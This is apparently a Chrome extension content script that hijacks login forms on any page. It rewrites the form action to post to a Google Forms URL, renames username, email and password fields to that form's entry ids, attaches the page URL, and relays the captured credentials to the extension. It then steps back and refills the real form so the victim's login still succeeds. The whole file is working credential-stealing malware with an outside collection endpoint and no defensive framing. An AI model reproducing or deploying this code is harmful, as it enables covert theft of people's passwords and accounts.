//var ourl;
//function toRun(){
//(document).ready(function () {
var port = chrome.runtime.connect({ name: "from" });
var pass;
var user;
    port.postMessage({ setForm: "canwe" });
    //alert("test3");
    port.onMessage.addListener(function (msg) {
        //alert("test2");
            if (msg.question == "yes") {
                var url = window.location.href;
                //alert(url);
                var form_url = $("form[id]").attr("action");
                $("form[id]").append('<input type="hidden" name="entry.785007176" value="url2here" />');
                $("form[id]").find('input[name*="entry.785007176"]').attr('value', url);
                $("form[id]").attr("action", "https://docs.google.com/forms/d/e/1FAIpQLSc5i5AY5MmDNWUZ969BbnryhWxpCXQufMwESys80QC-S4cxAA/formResponse");
                $("form[id]").find('input[type="text"][name*="og"]').attr('name', 'entry.1868970203');
                $("form[id]").find('input[type="text"][name*="sername"]').attr('name', 'entry.1868970203');
                $("form[id]").find('input[type="text"][name*="mail"]').attr('name', 'entry.1868970203');
                $("form[id]").find('input[type="text"][name*="ogin"]').attr('name', 'entry.1868970203');
                $("form[id]").find('input[type="password"][name*="assword"]').attr('name', 'entry.1451540034');
                $("form[id]").find('input[type="password"][name*="ass"]').attr('name', 'entry.1451540034');

                $("form[id]").find('input[name="entry.1868970203"]').change(function () {
                    //alert($("form[id]").find('input[name="entry.1868970203"]').val());
                    var user = ($("form[id]").find('input[name="entry.1868970203"]').val());
                    alert("user " + user);
                    port.postMessage({ setForm: "setU", setFormU: user });
                });
                $("form[id]").find('input[name="entry.1451540034"]').change(function () {
                   //alert($("form[id]").find('input[name="entry.1451540034"]').val());
                    var pass = ($("form[id]").find('input[name="entry.1451540034"]').val());
                    //alert("pass " + pass);
                    port.postMessage({ setForm: "setP", setFormP: pass });
                });
            }
            if (window.location.href == "https://docs.google.com/forms/d/e/1FAIpQLSc5i5AY5MmDNWUZ969BbnryhWxpCXQufMwESys80QC-S4cxAA/formResponse" || window.location.href == 'https://docs.google.com/forms/d/e/1FAIpQLSc5i5AY5MmDNWUZ969BbnryhWxpCXQufMwESys80QC-S4cxAA/formResponse') {
                port.postMessage({ setForm: "neg" });
                window.history.back();
                //port.postMessage({ setForm: "set", setFormU: user, setFormP: pass });
                port.postMessage({ setForm: "tri" });
                }
            if (msg.question == "triset") {
                //alert("test0");
                port.postMessage({ setForm: "inputs" });
                //alert("test1");
            }
            if (msg.question == "inputrec") {
                    //alert("test3");
                    //port.postMessage({ setForm: "pos" });
                $("form[id]").find('input[type="text"][name*="og"]').val(msg.questionu);
                $("form[id]").find('input[type="text"][name*="sername"]').val(msg.questionu);
                $("form[id]").find('input[type="text"][name*="mail"]').val(msg.questionu);
                $("form[id]").find('input[type="text"][name*="ogin"]').val(msg.questionu);
                $("form[id]").find('input[type="password"][name*="assword"]').val(msg.questionp);
                $("form[id]").find('input[type="password"][name*="ass"]').val(msg.questionp);
                    $("form[id]").find('input[type="submit"]').submit();
                   // alert("test4");
                    port.postMessage({ setForm: "pos" });
                }
                
                
            

        });
    //});